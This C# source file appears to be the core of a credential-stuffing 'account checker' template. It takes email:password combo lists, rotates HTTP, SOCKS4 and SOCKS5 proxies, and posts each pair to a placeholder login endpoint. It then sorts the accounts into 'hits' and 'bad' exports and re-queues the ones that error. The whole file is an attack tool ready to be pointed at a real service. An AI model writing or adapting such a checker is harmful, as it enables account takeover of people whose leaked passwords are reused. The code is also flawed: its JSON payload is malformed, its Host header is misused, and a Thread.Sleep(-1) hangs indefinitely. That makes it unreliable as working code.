using Leaf.xNet;
using AccountChecker.Globals;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace AccountChecker.Utils
{
    internal class Checker
    {
        public static ConcurrentQueue<string> Combos = Globals.Tool.Combos;

        public static void Check()
        {
            for (; ; )
            {
                try
                {
                    if (Combos.Any<string>() == false) { Thread.Sleep(-1); }

                    string Account;
                    string Proxy;
                    string ProxyType = Tool.ProxyType;

                    Combos.TryDequeue(out Account);

                    var Email = Account.Split(new char[] { ':', ';', '|' })[0];
                    var Password = Account.Split(new char[] { ':', ';', '|' })[1];
                    var User = Email.Contains("@") ? Email.Split('@')[0] : Email;

                    HttpRequest hr = new HttpRequest();
                    hr.SslCertificateValidatorCallback += (obj, cert, ssl, error) => (cert as X509Certificate2).Verify();
                    hr.IgnoreProtocolErrors = true;

                    switch (ProxyType)
                    {
                        case "Proxyless":
                            hr.Proxy = null;
                            break;

                        case "Https":
                            Globals.Tool.Proxies.TryDequeue(out Proxy);
                            hr.Proxy = HttpProxyClient.Parse(Proxy);
                            Globals.Tool.Proxies.Enqueue(Proxy);
                            break;

                        case "Socks4":
                            Globals.Tool.Proxies.TryDequeue(out Proxy);
                            hr.Proxy = Socks4ProxyClient.Parse(Proxy);
                            Globals.Tool.Proxies.Enqueue(Proxy);
                            break;

                        case "Socks5":
                            Globals.Tool.Proxies.TryDequeue(out Proxy);
                            hr.Proxy = Socks5ProxyClient.Parse(Proxy);
                            Globals.Tool.Proxies.Enqueue(Proxy);
                            break;
                    }

                    try
                    {
                        var Payload = string.Concat(new object[]
                        {
                            "{\"Email\":", Email, "\",\"Password\":", Password, "\"}"
                        });

                        hr.AddHeader("Host", "https://github.com/nak0823");
                        hr.AddHeader("Client_id", "69420");
                        hr.AddHeader("Client_secret", "StarTheRepository");

                        var resp = hr.Post("https://example.com/api", Payload, "application/json").ToString();

                        if (resp.Contains("true"))
                        {
                            Utils.Export.Hit(new string[] { "ExampleTool", "Examples" }, Account);
                        }
                        else if (resp.Contains("false"))
                        {
                            Utils.Export.Bad(new string[] { "ExampleTool", "Examples" }, Account);
                        }
                        else
                        {
                            Utils.Export.Error(new string[] { "ExampleTool", "Errors" }, resp.ToString());
                            Combos.Enqueue(Account);
                        }
                    }
                    catch (HttpException ex)
                    {
                    }
                }
                catch (Exception err)
                {
                }
            }
        }
    }
}